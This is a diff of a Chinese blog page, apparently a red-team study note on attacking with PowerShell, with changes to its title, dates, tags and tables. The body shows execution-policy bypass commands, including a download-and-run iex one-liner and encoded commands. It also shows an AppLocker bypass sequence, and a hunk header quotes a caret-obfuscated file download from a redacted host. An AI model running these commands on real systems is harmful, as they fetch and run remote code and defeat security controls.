@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="Hexo, NexT" />
+  <meta name="keywords" content="powershell,渗透,红队," />
 
 
 
@@ -82,16 +82,17 @@
 
 
 <meta name="description" content="本文大部分内容来自参考中的英文文档，根据笔者理解和google翻译写出本文。 主要讨论Powershell用于攻击的不同阶段，攻击框架的使用，攻击中遇到的问题 脚本执行策略查看当前系统的策略powershell为了防护恶意脚本的执行，设置了相应的执行策略。Get-ExecutionPolicy查看系统支持的所有策略[System.Enum]::GetNames([Microsoft.PowerSh">
+<meta name="keywords" content="powershell,渗透,红队">
 <meta property="og:type" content="article">
-<meta property="og:title" content="s0lt&#39;s Blog">
-<meta property="og:url" content="https://s0lt.github.io/2019/02/27/powershell渗透中的学习/index.html">
+<meta property="og:title" content="powershell渗透使用研究">
+<meta property="og:url" content="https://s0lt.github.io/2019/02/28/powershell渗透中的学习/index.html">
 <meta property="og:site_name" content="s0lt&#39;s Blog">
 <meta property="og:description" content="本文大部分内容来自参考中的英文文档，根据笔者理解和google翻译写出本文。 主要讨论Powershell用于攻击的不同阶段，攻击框架的使用，攻击中遇到的问题 脚本执行策略查看当前系统的策略powershell为了防护恶意脚本的执行，设置了相应的执行策略。Get-ExecutionPolicy查看系统支持的所有策略[System.Enum]::GetNames([Microsoft.PowerSh">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://s0lt.github.io/images/celue.png">
-<meta property="og:updated_time" content="2019-02-28T00:50:33.034Z">
+<meta property="og:updated_time" content="2019-02-28T01:05:43.081Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="s0lt&#39;s Blog">
+<meta name="twitter:title" content="powershell渗透使用研究">
 <meta name="twitter:description" content="本文大部分内容来自参考中的英文文档，根据笔者理解和google翻译写出本文。 主要讨论Powershell用于攻击的不同阶段，攻击框架的使用，攻击中遇到的问题 脚本执行策略查看当前系统的策略powershell为了防护恶意脚本的执行，设置了相应的执行策略。Get-ExecutionPolicy查看系统支持的所有策略[System.Enum]::GetNames([Microsoft.PowerSh">
 <meta name="twitter:image" content="https://s0lt.github.io/images/celue.png">
 
@@ -123,13 +124,13 @@
 
 
 
-  <link rel="canonical" href="https://s0lt.github.io/2019/02/27/powershell渗透中的学习/"/>
+  <link rel="canonical" href="https://s0lt.github.io/2019/02/28/powershell渗透中的学习/"/>
 
 
 
 
 
-  <title> | s0lt's Blog</title>
+  <title>powershell渗透使用研究 | s0lt's Blog</title>
   
 
 
@@ -266,7 +267,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://s0lt.github.io/2019/02/27/powershell渗透中的学习/">
+    <link itemprop="mainEntityOfPage" href="https://s0lt.github.io/2019/02/28/powershell渗透中的学习/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="s0lt">
@@ -283,7 +284,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline"></h1>
+          <h1 class="post-title" itemprop="name headline">powershell渗透使用研究</h1>
         
 
         <div class="post-meta">
@@ -295,8 +296,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-27T08:50:44+08:00">
-                2019-02-27
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-02-28T09:02:21+08:00">
+                2019-02-28
               </time>
             
 
@@ -335,7 +336,46 @@
       
         <p>本文大部分内容来自参考中的英文文档，根据笔者理解和google翻译写出本文。</p>
 <h3 id="主要讨论"><a href="#主要讨论" class="headerlink" title="主要讨论"></a>主要讨论</h3><p>Powershell用于攻击的不同阶段，攻击框架的使用，攻击中遇到的问题</p>
-<h3 id="脚本执行策略"><a href="#脚本执行策略" class="headerlink" title="脚本执行策略"></a>脚本执行策略</h3><p>查看当前系统的策略<br>powershell为了防护恶意脚本的执行，设置了相应的执行策略。<br><code>Get-ExecutionPolicy</code><br>查看系统支持的所有策略<br><code>[System.Enum]::GetNames([Microsoft.PowerShell.ExecutionPolicy])</code><br><img src="/images/celue.png" alt=""><br>|策略| 说明 |<br>|–|–|<br>|Unrestricted | 允许运行未签名的脚本。对于从网络上下载的脚本，在运行前会进行安全性提示|<br>|RemoteSigned|当执行从网络上下载的脚本时，需要脚本具有数字签名，否则不会运行这个脚本。如果是在本地创建的脚本则可以直接执行，不要求脚本具有数字签名。|<br>|AllSigned|允许执行所有具有数字签名的脚本|<br>|Restriceted|可以执行单个的命令，但是不能执行脚本|<br>|Default|Powershell默认的策略|<br>|Bypass|任何脚本都可以执行，并且不会有安全性提示。|<br>|Undefined|没有设置脚本策略。当然此时会发生继承或应用默认的脚本策略|</p>
+<h3 id="脚本执行策略"><a href="#脚本执行策略" class="headerlink" title="脚本执行策略"></a>脚本执行策略</h3><p>查看当前系统的策略<br>powershell为了防护恶意脚本的执行，设置了相应的执行策略。<br><code>Get-ExecutionPolicy</code><br>查看系统支持的所有策略<br><code>[System.Enum]::GetNames([Microsoft.PowerShell.ExecutionPolicy])</code><br><img src="/images/celue.png" alt=""></p>
+<a id="more"></a>
+<table>
+<thead>
+<tr>
+<th>策略</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Unrestricted</td>
+<td>允许运行未签名的脚本。对于从网络上下载的脚本，在运行前会进行安全性提示</td>
+</tr>
+<tr>
+<td>RemoteSigned</td>
+<td>当执行从网络上下载的脚本时，需要脚本具有数字签名，否则不会运行这个脚本。如果是在本地创建的脚本则可以直接执行，不要求脚本具有数字签名。</td>
+</tr>
+<tr>
+<td>AllSigned</td>
+<td>允许执行所有具有数字签名的脚本</td>
+</tr>
+<tr>
+<td>Restriceted</td>
+<td>可以执行单个的命令，但是不能执行脚本</td>
+</tr>
+<tr>
+<td>Default</td>
+<td>Powershell默认的策略</td>
+</tr>
+<tr>
+<td>Bypass</td>
+<td>任何脚本都可以执行，并且不会有安全性提示。</td>
+</tr>
+<tr>
+<td>Undefined</td>
+<td>没有设置脚本策略。当然此时会发生继承或应用默认的脚本策略</td>
+</tr>
+</tbody>
+</table>
 <h4 id="策略的绕过"><a href="#策略的绕过" class="headerlink" title="策略的绕过"></a>策略的绕过</h4><p>使用echo或者type将脚本内容pipe到powershell的标准输入中<br><code>TYPE myScript.ps1 | Powershell.exe -noprofile</code><br>使用-command命令下载脚本并执行<br><code>powershell.exe -command “iex(New-Object Net.WebClient).DownloadString(‘http://[REMOVED]/myScript.ps1’)”</code><br>使用-enc对命令进行编码<br><code>powershell.exe -enc [ENCODED COMMAND]</code><br>使用执行策略“bypass”或者“unrestricted”<br><code>powershell.exe -ExecutionPolicy bypass -File myScript.ps1</code><br>更改注册表执行策略<br><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell</code></p>
 <h3 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a>常用参数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-NoP / -NoProfile（忽略配置文件中的命令）</span><br><span class="line">-Enc / -EncodedCommand（运行Base64编码的命令）</span><br><span class="line">-W Hidden/-WindowStyle Hidden（隐藏命令</span><br><span class="line">窗口）</span><br><span class="line">-Exec bypass / -ExecutionPolicy Bypass（忽略</span><br><span class="line">执行政策限制）</span><br><span class="line">-NonI / -NonInteractive（不运行交互式shell）</span><br><span class="line">-C / -Command（运行单个命令）</span><br><span class="line">-F / -File（从指定文件运行命令）</span><br></pre></td></tr></table></figure>
 <h3 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(New-Object System.Net.Webclient).DownloadString()</span><br><span class="line">(New-Object System.Net.Webclient).DownloadFile()</span><br><span class="line">-IEX / -Invoke-Expression</span><br><span class="line">Start-Process</span><br></pre></td></tr></table></figure>
@@ -419,7 +459,7 @@ Ne^T^.^w^eB^cLie^n^T^).^Do^W^nlo^aDfi^Le(^’http://www. [REMOVED].top/user.php?
 <h3 id="AppLocker"><a href="#AppLocker" class="headerlink" title="AppLocker"></a>AppLocker</h3><p>限制脚本，dll等可执行文件的执行</p>
 <h4 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h4><p>作为非特权用户，我们可以通过调用PowerShell版本2（注意：必须已经启用），然后利用CL_LoadAssembly.ps1加载程序集来绕过AppLocker，从而绕过约束语言模式。为了完整起见，这里给出相应的命令序列：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">powershell -v 2 -ep bypass</span><br><span class="line">cd C:\windows\diagnostics\system\AERO</span><br><span class="line">import-module .\CL_LoadAssembly.ps1</span><br><span class="line">LoadAssemblyFromPath ..\..\..\..\temp\funrun.exe</span><br><span class="line">[funrun.hashtag]::winning()</span><br></pre></td></tr></table></figure></p>
 <p>常用绕过技术参考：<a href="https://github.com/api0cradle/UltimateAppLockerByPassList" target="_blank" rel="noopener">https://github.com/api0cradle/UltimateAppLockerByPassList</a></p>
-<p>参考：<a href="https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/increased-use-of-powershell-in-attacks-16-en.pdf" target="_blank" rel="noopener">https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/increased-use-of-powershell-in-attacks-16-en.pdf</a><br><a href="https://www.cnblogs.com/sparkdev/p/7460518.html" target="_blank" rel="noopener">https://www.cnblogs.com/sparkdev/p/7460518.html</a><br><a href="https://xz.aliyun.com/t/3095" target="_blank" rel="noopener">https://xz.aliyun.com/t/3095</a><br><a href="https://xz.aliyun.com/t/2247" target="_blank" rel="noopener">https://xz.aliyun.com/t/2247</a></p>
+<p>参考<br><a href="https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/increased-use-of-powershell-in-attacks-16-en.pdf" target="_blank" rel="noopener">https://www.symantec.com/content/dam/symantec/docs/security-center/white-papers/increased-use-of-powershell-in-attacks-16-en.pdf</a><br><a href="https://www.cnblogs.com/sparkdev/p/7460518.html" target="_blank" rel="noopener">https://www.cnblogs.com/sparkdev/p/7460518.html</a><br><a href="https://xz.aliyun.com/t/3095" target="_blank" rel="noopener">https://xz.aliyun.com/t/3095</a><br><a href="https://xz.aliyun.com/t/2247" target="_blank" rel="noopener">https://xz.aliyun.com/t/2247</a></p>
 
       
     </div>
@@ -435,6 +475,12 @@ Ne^T^.^w^eB^cLie^n^T^).^Do^W^nlo^aDfi^Le(^’http://www. [REMOVED].top/user.php?
 
     <footer class="post-footer">
       
+        <div class="post-tags">
+          
+            <a href="/tags/powershell-渗透-红队/" rel="tag"><i class="fa fa-tag"></i> powershell,渗透,红队</a>
+          
+        </div>
+      
 
       
       
@@ -444,8 +490,8 @@ Ne^T^.^w^eB^cLie^n^T^).^Do^W^nlo^aDfi^Le(^’http://www. [REMOVED].top/user.php?
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/02/22/Elasticsearch学习(二）/" rel="next" title="">
-                <i class="fa fa-chevron-left"></i> 
+              <a href="/2019/02/25/Elasticsearch学习(二）/" rel="next" title="Elasticsearch学习（二）">
+                <i class="fa fa-chevron-left"></i> Elasticsearch学习（二）
               </a>
             
           </div>
@@ -547,7 +593,7 @@ Ne^T^.^w^eB^cLie^n^T^).^Do^W^nlo^aDfi^Le(^’http://www. [REMOVED].top/user.php?
               
               <div class="site-state-item site-state-tags">
                 
-                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-count">2</span>
                   <span class="site-state-item-name">标签</span>
                 
               </div>
